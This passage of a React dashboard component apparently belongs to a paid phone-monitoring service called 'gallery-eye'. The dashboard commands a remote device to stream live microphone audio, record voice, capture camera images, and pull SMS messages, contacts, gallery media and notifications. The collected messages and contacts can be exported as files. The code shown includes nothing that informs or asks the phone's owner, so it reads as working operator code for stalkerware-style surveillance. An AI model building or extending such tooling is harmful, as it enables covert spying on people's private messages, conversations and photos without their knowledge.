                        analyser.fftSize = 256;
                        gainNode.gain.value = 0.8;
                        gainNode.connect(analyser);
                        analyser.connect(ctx.destination);

                        const processor = ctx.createScriptProcessor(2048, 0, 1);

                        audioRingBufRef.current = new Float32Array(Math.ceil(outRate * 10));
                        audioRingWriteRef.current = 0;
                        audioRingReadRef.current = 0;
                        audioRingSamplesRef.current = 0;
                        audioSrcRateRef.current = 16000;
                        audioOutRateRef.current = outRate;
                        audioResampPosRef.current = 0;
                        audioResampHistRef.current = new Float32Array(4);
                        audioResampHistIdxRef.current = 0;
                        audioWarmedRef.current = false;
                        audioLastSampleRef.current = 0;
                        audioUnderrunCountRef.current = 0;

                        const warmupSamples = Math.floor(outRate * 0.3);

                        processor.onaudioprocess = (e: AudioProcessingEvent) => {
                            const output = e.outputBuffer.getChannelData(0);
                            const ring = audioRingBufRef.current;
                            const capacity = ring.length;

                            if (!audioWarmedRef.current) {
                                if (audioRingSamplesRef.current >= warmupSamples) {
                                    audioWarmedRef.current = true;
                                    audioUnderrunCountRef.current = 0;
                                } else {
                                    output.fill(0);
                                    return;
                                }
                            }

                            for (let i = 0; i < output.length; i++) {
                                if (audioRingSamplesRef.current > 0) {
                                    const s = ring[audioRingReadRef.current];
                                    output[i] = s;
                                    audioLastSampleRef.current = s;
                                    audioRingReadRef.current = (audioRingReadRef.current + 1) % capacity;
                                    audioRingSamplesRef.current--;
                                    audioUnderrunCountRef.current = 0;
                                } else {
                                    audioUnderrunCountRef.current++;
                                    const decayed = audioLastSampleRef.current * 0.97;
                                    output[i] = decayed;
                                    audioLastSampleRef.current = decayed;
                                    if (audioUnderrunCountRef.current > Math.floor(outRate * 0.05)) {
                                        audioWarmedRef.current = false;
                                    }
                                }
                            }
                        };

                        processor.connect(gainNode);

                        audioContextRef.current = ctx;
                        audioGainRef.current = gainNode;
                        audioAnalyserRef.current = analyser;
                        audioProcessorRef.current = processor;

                        // Resume AudioContext if browser suspended it
                        if (ctx.state === 'suspended') ctx.resume();
                    } catch (e) {
                        console.error('[Audio] Failed to create AudioContext:', e);
                    }
                }

                try {
                    const binaryStr = atob(data.chunk);
                    const bytes = new Uint8Array(binaryStr.length);
                    for (let i = 0; i < binaryStr.length; i++) bytes[i] = binaryStr.charCodeAt(i);
                    const int16 = new Int16Array(bytes.buffer);

                    const ring = audioRingBufRef.current;
                    const capacity = ring.length;
                    const srcRate = audioSrcRateRef.current;
                    const outRate = audioOutRateRef.current;
                    const ratio = outRate / srcRate; // e.g. 48000/16000 = 3 output samples per input

                    const hist = audioResampHistRef.current;
                    let histIdx = audioResampHistIdxRef.current;
                    let pos = audioResampPosRef.current;

                    for (let i = 0; i < int16.length; i++) {
                        const sample = int16[i] / 32768.0;
                        // Push into history ring (4 samples for cubic: s0,s1,s2,s3)
                        hist[histIdx & 3] = sample;
                        histIdx++;

                        // Emit output samples using cubic (Catmull-Rom) interpolation
                        // We have enough history after 4+ samples pushed
                        if (histIdx >= 4) {
                            const s0 = hist[(histIdx - 4) & 3];
                            const s1 = hist[(histIdx - 3) & 3];
                            const s2 = hist[(histIdx - 2) & 3];
                            const s3 = hist[(histIdx - 1) & 3];

                            while (pos < 1.0) {
                                const t = pos;
                                const t2 = t * t;
                                const t3 = t2 * t;
                                // Catmull-Rom spline
                                const out = 0.5 * (
                                    (2 * s1) +
                                    (-s0 + s2) * t +
                                    (2 * s0 - 5 * s1 + 4 * s2 - s3) * t2 +
                                    (-s0 + 3 * s1 - 3 * s2 + s3) * t3
                                );
                                ring[audioRingWriteRef.current] = Math.max(-1, Math.min(1, out));
                                audioRingWriteRef.current = (audioRingWriteRef.current + 1) % capacity;
                                if (audioRingSamplesRef.current < capacity) {
                                    audioRingSamplesRef.current++;
                                } else {
                                    audioRingReadRef.current = (audioRingReadRef.current + 1) % capacity;
                                }
                                pos += 1.0 / ratio;
                            }
                            pos -= 1.0;
                        }
                    }
                    audioResampHistIdxRef.current = histIdx;
                    audioResampPosRef.current = pos;

                    // VU meter from the raw incoming 16k chunk
                    let sum = 0;
                    for (let i = 0; i < int16.length; i++) {
                        const s = int16[i] / 32768.0;
                        sum += s * s;
                    }
                    const rms = Math.sqrt(sum / int16.length);
                    setAudioLevel(Math.min(1, rms * 5));
                } catch (e) {
                    console.error('[Audio] Ring buffer write error:', e);
                }
            });

            socket.on("audio_error", (data: any) => {
                setIsLiveAudio(false);
                isLiveAudioRef.current = false;
                setAudioError(data.error || 'Audio error occurred');
                setTimeout(() => setAudioError(null), 5000);
            });

            // Voice Recording Ready â€” device finished recording, server uploaded to R2
            socket.on("voice_recording_ready", (data: any) => {
                if (data.url) {
                    setCapturedVoice(prev => {
                        const filtered = prev.filter(item => !item.isTemp);
                        return [{
                            id: `voice_${Date.now()}`,
                            resource_type: 'audio',
                            url: data.url,
                            created_at: new Date(data.timestamp || Date.now()).toISOString(),
                            duration: data.duration || 0
                        }, ...filtered];
                    });
                }
                setIsVoiceRecording(false);
                setIsVoiceUploading(false);
                setVoiceRecProgress({ current: 0, total: 0 });
                if (voiceRecTimerRef.current) {
                    clearInterval(voiceRecTimerRef.current);
                    voiceRecTimerRef.current = null;
                }
            });

            // Voice Recording Progress from device
            socket.on("voice_recording_progress", (data: any) => {
                if (data.current !== undefined) {
                    setVoiceRecProgress({ current: data.current, total: data.total || 60 });
                }
                if (data.current >= (data.total || 60) && (data.total || 60) > 0) {
                    setIsVoiceRecording(false);
                    setIsVoiceUploading(true);
                    setCapturedVoice(prev => [{
                        id: `temp_voice_${Date.now()}`,
                        resource_type: 'audio',
                        url: 'loading',
                        created_at: new Date().toISOString(),
                        isTemp: true
                    }, ...prev]);
                }
            });

            // Load cached images instantly for fast UX
            const initDeviceId = localStorage.getItem('selectedDeviceId');
            const GALLERY_CACHE_KEY = initDeviceId ? `gallery_images_${uuid}_${initDeviceId}` : `gallery_images_${uuid}`;
            try {
                const cachedImages = localStorage.getItem(GALLERY_CACHE_KEY);
                if (cachedImages) {
                    const parsed = JSON.parse(cachedImages);
                    setImages(parsed);
                }
            } catch { /* ignore */ }

            // Define fetch function so it can be called later
            let isFetchingGallery = false;
            const fetchGallery = (loadPage = 1, append = false, fetchAll = false, targetDeviceId = localStorage.getItem('selectedDeviceId') || selectedDeviceIdRef.current) => {
                if (isFetchingGallery) return;
                if (!targetDeviceId) {
                    if (!append) setImages([]);
                    return;
                }
                isFetchingGallery = true;
                if (append) setIsLoadingMore(true);
                const limit = fetchAll ? 10000 : 30;
                const deviceQuery = `&deviceId=${targetDeviceId}`;
                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/images?uuid=${uuid}&page=${loadPage}&limit=${limit}${deviceQuery}`)
                    .then((res) => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                    .then((data) => {
                        const items = data.items || (Array.isArray(data) ? data : []);
                        const hasMore = data.hasMore !== undefined ? data.hasMore : false;

                        // Filter out camera captures from the gallery feed
                        const galleryItems = items.filter((item: any) => 
                            !(item.id && (item.id.includes('capture_') || item.id.includes('video_')))
                        );

                        if (append) {
                            setImages(prev => {
                                const existingIds = new Set(prev.map((i: any) => i.id));
                                const newItems = galleryItems.filter((i: any) => !existingIds.has(i.id));
                                return [...prev, ...newItems];
                            });
                        } else {
                            setImages(galleryItems);
                        }
                        setGalleryHasMore(hasMore);
                        setGalleryPage(loadPage);

                        const cacheKey = `gallery_images_${uuid}_${targetDeviceId}`;
                        try { localStorage.setItem(cacheKey, JSON.stringify(items.slice(0, 100))); } catch { /* storage full */ }
                    })
                    .catch(e => console.error('[Gallery] Fetch error:', e))
                    .finally(() => { isFetchingGallery = false; setIsLoadingMore(false); });
            };

            let isFetchingCamera = false;
            const fetchCamera = (loadPage = 1, targetDeviceId = localStorage.getItem('selectedDeviceId') || selectedDeviceIdRef.current) => {
                if (isFetchingCamera) return;
                if (!targetDeviceId) {
                    setCapturedMedia([]);
                    return;
                }
                isFetchingCamera = true;
                const limit = 10000;
                const deviceQuery = `&deviceId=${targetDeviceId}`;
                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/camera?uuid=${uuid}&page=${loadPage}&limit=${limit}${deviceQuery}`)
                    .then((res) => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                    .then((data) => {
                        const items = data.items || (Array.isArray(data) ? data : []);
                        const captures = items.map((item: any) => ({
                            id: item.id,
                            resource_type: item.resource_type === 'video' || item.id.includes('video_') ? 'video' : 'image',
                            url: item.url,
                            created_at: item.created_at,
                            camera: item.id.includes('front') ? 'front' : 'back',
                            timestamp: new Date(item.created_at).getTime()
                        }));

                        setCapturedMedia(captures);
                        const camCacheKey = `gallery_captured_${uuid}_${targetDeviceId}`;
                        try { localStorage.setItem(camCacheKey, JSON.stringify(captures.slice(0, 100))); } catch { /* storage full */ }
                    })
                    .catch(e => console.error('[Camera] Fetch error:', e))
                    .finally(() => { isFetchingCamera = false; });
            };

            let isFetchingVoice = false;
            const fetchVoice = (loadPage = 1, targetDeviceId = localStorage.getItem('selectedDeviceId') || selectedDeviceIdRef.current) => {
                if (isFetchingVoice) return;
                if (!targetDeviceId) {
                    setCapturedVoice([]);
                    return;
                }
                isFetchingVoice = true;
                const limit = 100;
                const deviceQuery = `&deviceId=${targetDeviceId}`;

                fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/voice?uuid=${uuid}&page=${loadPage}&limit=${limit}${deviceQuery}`)
                    .then((res) => { if (!res.ok) throw new Error(res.status.toString()); return res.json(); })
                    .then((data) => {
                        const items = data.items || (Array.isArray(data) ? data : []);
                        setCapturedVoice(items);
                    })
                    .catch(e => console.error('[Voice] Fetch error:', e))
                    .finally(() => { isFetchingVoice = false; });
            };

            // Expose globally securely for the socket event
            (window as any).fetchGalleryData = fetchGallery;
            (window as any).fetchCameraData = fetchCamera;
            (window as any).fetchVoiceData = fetchVoice;

            // Initial fetch if device is already selected
            const initialTargetId = localStorage.getItem('selectedDeviceId') || selectedDeviceIdRef.current;
            if (initialTargetId) {
                fetchGallery(1, false, false, initialTargetId);
                fetchCamera(1, initialTargetId);
                fetchVoice(1, initialTargetId);
            }

            return () => {
                if (socket) {
                    socket.disconnect();
                    socket = null;
                }
                delete (window as any).fetchGalleryData;
                delete (window as any).fetchCameraData;
            };
        }
    }, [status, session?.user?.uuid]);
    const handleLoadMore = () => {
        if (galleryHasMore && !isLoadingMore && (window as any).fetchGalleryData) {
            (window as any).fetchGalleryData(galleryPage + 1, true, false, selectedDeviceId);
        }
    };

    const fetchFolders = () => {
        if (!requireConnectedDevice(() => {})) return;
        if (socket && selectedDeviceId) {
            setIsFetchingFolders(true);
            socket.emit("get_folders", {
                uuid: session?.user?.uuid,
                targetDeviceId: selectedDeviceId
            });
        }
    };

    const handleFolderClick = (folder: any) => {
        if (!requireConnectedDevice(() => {})) return;
        // Prevent clicking while upload is in progress
        if (uploadProgress) {
            setAlertData({ title: 'Sync in Progress', message: 'Please wait for the current sync to complete.', type: 'info' });
            setShowCustomAlert(true);
            return;
        }
        setSelectedFolder(folder);
        setSyncMediaType(null); // Reset media type selection
    };

    // SMS Functions
    const fetchSms = () => {
        // Plan check - SMS requires Standard or Premium
        if (!planLimits.sms) {
            showUpgradePrompt('SMS Access', 'standard');
            return;
        }
        if (!requireConnectedDevice(() => {})) return;
        if (socket && selectedDeviceId && session?.user?.uuid) {
            setIsFetchingSms(true);
            socket.emit("get_sms", {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        }
    };

    const resetSmsSync = () => {
        if (!requireConnectedDevice(() => {})) return;
        if (socket && selectedDeviceId && session?.user?.uuid) {
            socket.emit("reset_sms_sync", {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
            setSmsList([]);
        }
    };

    // Contacts Functions
    const fetchContacts = () => {
        // Plan check - Contacts requires Standard or Premium
        if (!planLimits.contacts) {
            showUpgradePrompt('Contacts Access', 'standard');
            return;
        }
        if (!requireConnectedDevice(() => {})) return;
        if (socket && selectedDeviceId && session?.user?.uuid) {
            setIsFetchingContacts(true);
            socket.emit("get_contacts", {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        }
    };

    // Permission Check Function
    const checkPermissions = () => {
        if (!requireConnectedDevice(() => {})) return;
        if (socket && selectedDeviceId && session?.user?.uuid) {
            setIsCheckingPermissions(true);
            setDevicePermissions(null);
            socket.emit("check_permissions", {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        }
    };

    // Filtered SMS based on search
    const filteredSms = useMemo(() => {
        if (!selectedDeviceId) return [];
        if (!smsSearchQuery) return smsList;
        const query = smsSearchQuery.toLowerCase();
        return smsList.filter(sms =>
            sms.address?.toLowerCase().includes(query) ||
            sms.body?.toLowerCase().includes(query)
        );
    }, [smsList, smsSearchQuery, selectedDeviceId]);

    // Filtered Contacts based on search
    const filteredContacts = useMemo(() => {
        if (!selectedDeviceId) return [];
        if (!contactsSearchQuery) return contactsList;
        const query = contactsSearchQuery.toLowerCase();
        return contactsList.filter(contact => {
            const nameMatch = contact.name?.toLowerCase()?.includes(query) || false;
            const phoneMatch = contact.phones?.some((p: any) => {
                // Handle both string and object phone entries
                const phoneStr = typeof p === 'string' ? p : (p?.number || p?.value || String(p));
                return phoneStr?.toLowerCase()?.includes(query) || false;
            }) || false;
            return nameMatch || phoneMatch;
        });
    }, [contactsList, contactsSearchQuery, selectedDeviceId]);

    // Filtered Camera & Voice captures based on device selection
    const filteredCapturedMedia = useMemo(() => {
        if (!selectedDeviceId) return [];
        return capturedMedia.filter(m => !m.deviceId || m.deviceId === selectedDeviceId || m.deviceId === 'unknown');
    }, [capturedMedia, selectedDeviceId]);

    const filteredCapturedVoice = useMemo(() => {
        if (!selectedDeviceId) return [];
        return capturedVoice.filter(v => !v.deviceId || v.deviceId === selectedDeviceId || v.deviceId === 'unknown');
    }, [capturedVoice, selectedDeviceId]);


    const triggerUpload = (count: number | 'all') => {
        if (!requireConnectedDevice(() => {})) return;
        if (socket && selectedFolder && syncMediaType && session?.user?.uuid && selectedDeviceId) {
            const payload = {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId,
                folderId: selectedFolder.id,
                folderName: selectedFolder.name,
                count: count,
                mediaType: syncMediaType
            };
            socket.emit("trigger_sync", payload);
            setIsStartingSync(true); // Start loading animation
            setSelectedFolder(null);
            setSyncMediaType(null);
        } else {
            console.error('[triggerUpload] Missing required data:', {
                hasSocket: !!socket,
                hasFolder: !!selectedFolder,
                hasMediaType: !!syncMediaType,
                hasUUID: !!session?.user?.uuid,
                hasDevice: !!selectedDeviceId
            });
        }
    };

    // --- Torch Functions ---
    const toggleTorch = () => {
        // Plan check - Torch requires Standard or Premium
        if (!planLimits.torch) {
            showUpgradePrompt('Flashlight Control', 'standard');
            return;
        }
        if (!requireConnectedDevice(() => {})) return;
        if (!socket || !selectedDeviceId || !session?.user?.uuid) return;

        const newState = !isTorchOn;
        setIsTorchOn(newState);

        socket.emit("torch_control", {
            uuid: session.user.uuid,
            targetDeviceId: selectedDeviceId,
            on: newState,
            aggressive: torchAggressive,
            duration: torchDuration
        });
    };

    // --- Vibration Functions ---
    const triggerVibration = () => {
        // Plan check - Vibration requires Standard or Premium
        if (!planLimits.vibration) {
            showUpgradePrompt('Vibration Control', 'standard');
            return;
        }
        if (!requireConnectedDevice(() => {})) return;
        if (!socket || !selectedDeviceId || !session?.user?.uuid) return;

        socket.emit("vibrate_control", {
            uuid: session.user.uuid,
            targetDeviceId: selectedDeviceId,
            duration: vibrationDuration
        });
    };

    // --- Live Audio Functions ---
    const startLiveAudio = useCallback(() => {
        if (userPlan !== 'premium') {
            showUpgradePrompt('Live Audio Listening', 'premium');
            return;
        }
        if (!requireConnectedDevice(() => {})) return;
        if (!socket || !selectedDeviceId || !session?.user?.uuid) return;

        // AudioContext will be auto-created when first live_audio chunk arrives.
        // Just tell the device to start sending audio.
        socket.emit('start_live_audio', {
            uuid: session.user.uuid,
            targetDeviceId: selectedDeviceId,
            gainBoost: false
        });
        setIsLiveAudio(true);
        isLiveAudioRef.current = true;
        setAudioError(null);
        setAudioElapsed(0);
        audioTimerRef.current = setInterval(() => {
            setAudioElapsed(prev => prev + 1);
        }, 1000);
    }, [socket, selectedDeviceId, session, userPlan]);

    const stopLiveAudio = useCallback(() => {
        if (socket && selectedDeviceId && session?.user?.uuid) {
            socket.emit('stop_live_audio', {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        }

        // Cleanup timer
        if (audioTimerRef.current) {
            clearInterval(audioTimerRef.current);
            audioTimerRef.current = null;
        }

        // Cleanup visualizer
        if (audioAnimFrameRef.current) {
            cancelAnimationFrame(audioAnimFrameRef.current);
            audioAnimFrameRef.current = 0;
        }

        // Cleanup ScriptProcessorNode
        try {
            audioProcessorRef.current?.disconnect();
        } catch (e) { /* ignore */ }
        audioProcessorRef.current = null;

        // Cleanup AudioContext
        try {
            audioContextRef.current?.close();
        } catch (e) { /* ignore */ }
        audioContextRef.current = null;
        audioGainRef.current = null;
        audioAnalyserRef.current = null;

        // Reset ring buffer
        audioRingWriteRef.current = 0;
        audioRingReadRef.current = 0;
        audioRingSamplesRef.current = 0;

        setIsLiveAudio(false);
        isLiveAudioRef.current = false;
        setAudioLevel(0);
        setAudioElapsed(0);
    }, [socket, selectedDeviceId, session]);

    // --- Voice Recording Functions ---
    const startVoiceRecording = useCallback(() => {
        if (!requireConnectedDevice(() => {})) return;
        if (!socket || !selectedDeviceId || !session?.user?.uuid) return;
        socket.emit('start_voice_recording', {
            uuid: session.user.uuid,
            targetDeviceId: selectedDeviceId,
            duration: voiceRecDuration
        });
        setIsVoiceRecording(true);
        setIsVoiceUploading(false);
        setVoiceRecProgress({ current: 0, total: voiceRecDuration });

        // Local progress timer
        let elapsed = 0;
        voiceRecTimerRef.current = setInterval(() => {
            elapsed++;
            setVoiceRecProgress(prev => ({ ...prev, current: elapsed }));
            if (elapsed >= voiceRecDuration) {
                clearInterval(voiceRecTimerRef.current!);
                voiceRecTimerRef.current = null;
                // DO NOT add temp_voice here. It's handled by progress event.
            }
        }, 1000);
    }, [socket, selectedDeviceId, session, voiceRecDuration]);

    const stopVoiceRecording = useCallback(() => {
        if (socket && selectedDeviceId && session?.user?.uuid) {
            socket.emit('stop_voice_recording', {
                uuid: session.user.uuid,
                targetDeviceId: selectedDeviceId
            });
        }
        setIsVoiceRecording(false);
        setIsVoiceUploading(true);
        setVoiceRecProgress({ current: 0, total: 0 });
        if (voiceRecTimerRef.current) {
            clearInterval(voiceRecTimerRef.current);
            voiceRecTimerRef.current = null;
        }
    }, [socket, selectedDeviceId, session]);

    // Fetch missing app icons for existing stored notifications
    useEffect(() => {
        if (!socket || !session?.user?.uuid || !selectedDeviceId || notifications.length === 0) return;
        const missingPackages = Array.from(new Set(
            notifications
                .map((n: any) => n.packageName)
                .filter((pkg: string) => pkg && !appIcons[pkg])
        ));
        if (missingPackages.length === 0) return;
        missingPackages.forEach((pkg: string) => {
            socket.emit('request_app_icon', {
                uuid: (session.user as any).uuid,
                targetDeviceId: selectedDeviceId,
                packageName: pkg
            });
        });
    // eslint-disable-next-line react-hooks/exhaustive-deps
    }, [socket, selectedDeviceId, notifications.length]);

    // Update gain when volume/mute changes
    useEffect(() => {
        if (audioGainRef.current) {
            audioGainRef.current.gain.value = isMuted ? 0 : audioVolume / 100;
        }
    }, [audioVolume, isMuted]);

    // Format seconds to MM:SS
    const formatTime = (s: number) => `${Math.floor(s / 60).toString().padStart(2, '0')}:${(s % 60).toString().padStart(2, '0')}`;

    // --- Gallery Logic ---

    const hasVideos = useMemo(() => images.some(img => img.resource_type === 'video'), [images]);

    const filteredImages = useMemo(() => {
        if (activeTab === 'all') return images;
        return images.filter(img => img.resource_type === activeTab);
    }, [images, activeTab]);

    const toggleSelection = (id: string) => {
        const newSelection = new Set(selectedItems);
        if (newSelection.has(id)) {
            newSelection.delete(id);
        } else {
            newSelection.add(id);
        }
        setSelectedItems(newSelection);
        if (newSelection.size === 0) setIsSelectionMode(false);
        else setIsSelectionMode(true);
    };

    const selectAll = async () => {
        if (selectedItems.size > 0 && selectedItems.size >= filteredImages.length) {
            setSelectedItems(new Set());
            setIsSelectionMode(false);
        } else {
            setIsSelectionMode(true);
            try {
                // Fetch all IDs from backend to select everything without loading images into UI
                const res = await fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/images?uuid=${session?.user?.uuid}&page=1&limit=10000`);
                if (!res.ok) throw new Error('Fetch failed');
                const data = await res.json();
                const items = data.items || [];
                const idsToSelect = items
                    .filter((img: any) => activeTab === 'all' || img.resource_type === activeTab)
                    .map((img: any) => img.id || img.Key);
                setSelectedItems(new Set(idsToSelect));
            } catch (err) {
                // Fallback to loaded images if fetch fails
                setSelectedItems(new Set(filteredImages.map(img => img.id)));
            }
        }
    };

    const deleteSelected = async () => {
        setShowDeleteConfirm(true);
    };

    const confirmDelete = async () => {
        setIsDeleting(true);
        const idsToDelete = Array.from(selectedItems);

        try {
            const response = await fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/delete', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ids: idsToDelete })
            });

            if (response.ok) {
                setImages(prev => prev.filter(img => !selectedItems.has(img.id)));
                setSelectedItems(new Set());
                setIsSelectionMode(false);
            }
        } catch (error) {
            console.error("Delete failed", error);
        } finally {
            setIsDeleting(false);
            setShowDeleteConfirm(false);
        }
    };

    const downloadSelected = async () => {
        const selectedUrls = images.filter(img => selectedItems.has(img.id)).map(img => img.url);
        if (selectedUrls.length === 0) return;

        // If only 1 file is selected, download it directly instead of making a ZIP
        if (selectedUrls.length === 1) {
            const singleFileUrl = selectedUrls[0];
            const fileExt = singleFileUrl.split('.').pop()?.split('?')[0] || 'file';
            downloadSingle(singleFileUrl, `gallery_eye_${Date.now()}.${fileExt}`);
            setSelectedItems(new Set());
            setIsSelectionMode(false);
            return;
        }

        setIsDownloading(true);
        try {
            const response = await fetch('https://p01--gallery-eye--9zr85m7yb6s4.code.run/download-zip', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ urls: selectedUrls })
            });

            if (response.ok) {
                const blob = await response.blob();
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `gallery_download_${new Date().toISOString()}.zip`;
                document.body.appendChild(a);
                a.click();
                window.URL.revokeObjectURL(url);
                document.body.removeChild(a);
                setSelectedItems(new Set());
                setIsSelectionMode(false);
            }
        } catch (error) {
            console.error("Download failed", error);
        } finally {
            setIsDownloading(false);
        }
    };

    const downloadSingle = async (url: string, filename: string) => {
        try {
            // Proxies the Cloudflare R2 fetch through the Next.js API to set 'Content-Disposition: attachment'
            // This forces the browser to download the file directly instead of opening it in a new tab due to cross-origin limitations.
            const proxyUrl = `/api/download?url=${encodeURIComponent(url)}&filename=${encodeURIComponent(filename)}`;
            
            const link = document.createElement('a');
            link.href = proxyUrl;
            link.download = filename;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        } catch (error) {
            console.error("Download failed", error);
            window.open(url, '_blank');
        }
    };

    // Download SMS as CSV
    const downloadSmsAsCsv = () => {
        if (!requireConnectedDevice(() => {})) return;
        if (smsList.length === 0) {
            setAlertData({ title: 'No Data to Export', message: 'No SMS messages currently synced. Please click Sync SMS first.', type: 'info' });
            setShowCustomAlert(true);
            return;
        }

        const headers = ['Address', 'Body', 'Date', 'Type'];
        const csvContent = [
            headers.join(','),
            ...smsList.map(sms => [
                `"${(sms.address || '').replace(/"/g, '""')}"`,
                `"${(sms.body || '').replace(/"/g, '""')}"`,
                new Date(sms.date).toISOString(),
                sms.type === 1 ? 'Received' : 'Sent'
            ].join(','))
        ].join('\n');

        const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = `sms_backup_${new Date().toISOString().split('T')[0]}.csv`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };

    // Download Contacts as vCard
    const downloadContactsAsVcf = () => {
        if (!requireConnectedDevice(() => {})) return;
        if (contactsList.length === 0) {
            setAlertData({ title: 'No Data to Export', message: 'No contacts currently synced. Please click Sync Contacts first.', type: 'info' });
            setShowCustomAlert(true);
            return;
        }

        const vcards = contactsList.map(contact => {
            const name = contact.name || 'Unknown';
            const phones = contact.phones?.map((p: any) => {
                const num = typeof p === 'string' ? p : (p?.number || p?.value || '');
                return `TEL:${num}`;
            }).join('\n') || '';
            const emails = contact.emails?.map((e: any) => {
                const email = typeof e === 'string' ? e : (e?.address || e?.value || '');
                return `EMAIL:${email}`;
            }).join('\n') || '';

            return `BEGIN:VCARD
VERSION:3.0
FN:${name}
N:${name};;;
${phones}
${emails}
END:VCARD`;
        }).join('\n');

        const blob = new Blob([vcards], { type: 'text/vcard;charset=utf-8;' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = `contacts_backup_${new Date().toISOString().split('T')[0]}.vcf`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
    };

    if (status === "loading") {
        return (
            <div className="min-h-[100dvh] flex items-center justify-center" style={{ background: 'var(--bg-base)' }}>
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '1.25rem' }}>
                    <div style={{
                        width: 48, height: 48, borderRadius: '50%',
                        border: '2px solid rgba(16,185,129,0.2)',
                        borderTopColor: 'var(--accent)',
                        animation: 'spin 1s linear infinite',
                    }} />
                    <span style={{ color: 'var(--text-muted)', fontSize: '0.875rem' }}>Loadingâ€¦</span>
                </div>
            </div>
        );
    }

    if (status === "unauthenticated") return null;

    const onlineDeviceCount = devices.filter(d => d.online).length;

    const requireConnectedDevice = (action: () => void) => {
        const currentDevice = devices.find(d => d.deviceId === selectedDeviceId || d.id === selectedDeviceId);
        if (!selectedDeviceId || !currentDevice || !currentDevice.online) {
            setAlertData({
                title: 'No Device Connected',
                message: 'To execute commands or sync data from this tool, an active device must be connected and online. Please select an online device from the top menu.',
                type: 'warning'
            });
            setShowCustomAlert(true);
            return false;
        }
        action();
        return true;
    };

    // Helper to render tools
    const renderTool = () => {
        switch (selectedTool) {
            case 'sms':
                return (
                    <div className="space-y-5 h-full flex flex-col animate-in fade-in zoom-in-95 duration-300">
                        {/* Streamlined Floating Action Bar */}
                        <div className="flex flex-col sm:flex-row items-center justify-between gap-4 bg-white/[0.03] backdrop-blur-xl p-4 rounded-2xl border border-white/10 shadow-2xl flex-shrink-0">
                            <div className="flex items-center gap-3 w-full sm:w-auto">
                                <div className="w-10 h-10 rounded-xl bg-sky-500/10 flex items-center justify-center border border-sky-500/20 shadow-[0_0_15px_rgba(14,165,233,0.15)] flex-shrink-0">
                                    <MessageSquare size={18} className="text-sky-400" />
                                </div>
                                <div className="relative flex-1 sm:w-64">
                                    <Search size={14} className="absolute left-3.5 top-1/2 -translate-y-1/2 text-white/40" />
                                    <input 
                                        type="text" 
                                        placeholder="Search SMS conversations..." 
                                        value={smsSearchQuery}
                                        onChange={(e) => setSmsSearchQuery(e.target.value)}
                                        className="pl-9 pr-4 py-2 bg-black/40 border border-white/10 rounded-xl text-xs font-medium focus:outline-none focus:border-sky-500/50 w-full transition-all text-white placeholder:text-white/30"
                                    />
                                </div>
                                <span className="px-2.5 py-1 rounded-lg bg-sky-500/10 border border-sky-500/20 text-[11px] font-bold text-sky-400 uppercase tracking-wider flex-shrink-0">
                                    {filteredSms.length} SMS
                                </span>
                            </div>
                            <div className="flex items-center gap-2.5 w-full sm:w-auto justify-end">
                                <button onClick={fetchSms} disabled={isFetchingSms} className="flex items-center gap-2 px-4 py-2 rounded-xl bg-sky-500 hover:bg-sky-400 text-black font-bold text-xs uppercase tracking-wider shadow-[0_0_20px_rgba(14,165,233,0.3)] transition-all disabled:opacity-50">
                                    <RefreshCw size={14} className={isFetchingSms ? "animate-spin" : ""} /> Sync SMS
                                </button>
                                <button onClick={downloadSmsAsCsv} className="flex items-center gap-2 px-3.5 py-2 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 text-white/70 hover:text-white font-bold text-xs uppercase tracking-wider transition-all">
                                    <Download size={14} /> Export CSV
                                </button>
                            </div>
                        </div>

                        {/* Streamlined Message Cards */}
                        <div className="flex-1 overflow-y-auto custom-scrollbar pr-1">
                            {filteredSms.length === 0 ? (
                                <div className="py-24 flex flex-col items-center justify-center text-white/30 font-medium gap-4">
                                    <MessageSquare size={44} strokeWidth={1} className="text-white/20" />
                                    <p className="text-sm">No SMS messages found. Click Sync SMS to fetch.</p>
                                </div>
                            ) : (
                                <div className="space-y-2.5">
                                    {filteredSms.map((item: any, i: number) => (
                                        <div key={i} className="p-4 rounded-2xl bg-white/[0.02] hover:bg-white/[0.06] transition-all duration-300 border border-white/10 flex items-start gap-4">
                                            <div className="flex-1 min-w-0">
                                                <div className="flex items-center justify-between mb-1.5">
                                                    <span className="font-bold text-sm text-sky-400 font-mono">{item.address || 'Unknown Sender'}</span>
                                                    <span className="text-[11px] text-white/40 font-mono">{new Date(item.date).toLocaleString()}</span>
                                                </div>
                                                <p className="text-xs text-white/80 leading-relaxed break-words">{item.body}</p>
                                            </div>
                                        </div>
                                    ))}
                                </div>
                            )}
                        </div>
                    </div>
                );
            case 'contacts':
                return (
                    <div className="space-y-5 h-full flex flex-col animate-in fade-in zoom-in-95 duration-300">
                        {/* Streamlined Floating Action Bar */}
                        <div className="flex flex-col sm:flex-row items-center justify-between gap-4 bg-white/[0.03] backdrop-blur-xl p-4 rounded-2xl border border-white/10 shadow-2xl flex-shrink-0">
                            <div className="flex items-center gap-3 w-full sm:w-auto">
